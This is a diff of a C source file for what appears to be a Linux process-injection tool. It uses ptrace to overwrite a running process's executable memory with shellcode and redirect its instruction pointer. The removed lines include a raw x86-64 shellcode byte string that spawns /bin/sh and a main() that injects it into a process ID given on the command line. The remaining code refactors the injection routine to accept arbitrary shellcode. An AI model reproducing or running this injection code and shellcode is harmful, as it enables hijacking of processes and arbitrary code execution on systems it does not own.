@@ -1,24 +1,16 @@
 #include <stdio.h>
-#include <stdlib.h>
-#include <stdint.h>
 #include <sys/ptrace.h>
-#include <sys/types.h>
 #include <string.h>
 #include <dlfcn.h>
 #include <sys/wait.h>
 #include <sys/user.h>
 #include <unistd.h>
 
+#include "inject.h"
 #include "ptrace_utils.h"
 
 #define IF_FAILURE_THEN_DONE(res) do { if(0 != res) goto done; } while(0)
-
-
 #define ONEKB 1024
-
-
-
-unsigned char shellcode[] = "\x90\x90\x90\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb8\x3b\x00\x00\x00\x0f\x05";
 
 
 /**
@@ -95,7 +87,7 @@ unsigned long findExecAddr(pid_t pid) {
 }
 
 
-int inject_shellcode(pid_t pid, void* payload, size_t payload_len, uint8_t options){
+int inject_shellcode(pid_t pid, void* shellcode, size_t shellcode_len, uint8_t options){
 
 	unsigned char *oldcode = NULL;
 	struct user_regs_struct oldregs;
@@ -125,15 +117,15 @@ int inject_shellcode(pid_t pid, void* payload, size_t payload_len, uint8_t optio
 	}
 
 	// Allocate memory for code we carve out
-	oldcode = malloc(sizeof(shellcode)*sizeof(uint8_t));
+	oldcode = malloc(shellcode_len * sizeof(uint8_t));
 
 	// Read out a copy of the code occupying executable memory
-	result = ptraceRead(pid, addr, oldcode, sizeof(shellcode));
+	result = ptraceRead(pid, addr, oldcode, shellcode_len);
 	IF_FAILURE_THEN_DONE(result);
 	
 	// Inject
-	printf("[+] Injecting %lu bytes of shellcode...\n", payload_len);
-	result = ptraceWrite(pid, addr, shellcode, sizeof(shellcode));
+	printf("[+] Injecting %lu bytes of shellcode...\n", shellcode_len);
+	result = ptraceWrite(pid, addr, shellcode, shellcode_len);
 	IF_FAILURE_THEN_DONE(result);
 	
 	regs.rip = addr + 2;
@@ -152,21 +144,7 @@ done:
 	return result;
 }
 
-int main(int argc, char* argv[]) {
 
-	int pid = 0;
-
-	if(argc != 2){
-		printf("[-] Improper number of args...\n");
-		exit(EXIT_FAILURE);
-	}
-	pid = atoi(argv[1]);
-
-	inject_shellcode(pid, shellcode, sizeof(shellcode), 0);
-	//inject_so();
-
-    return 0;
-}
 
 /*
     unsigned long long target_libdl_exemem, self_libdl_exemem;
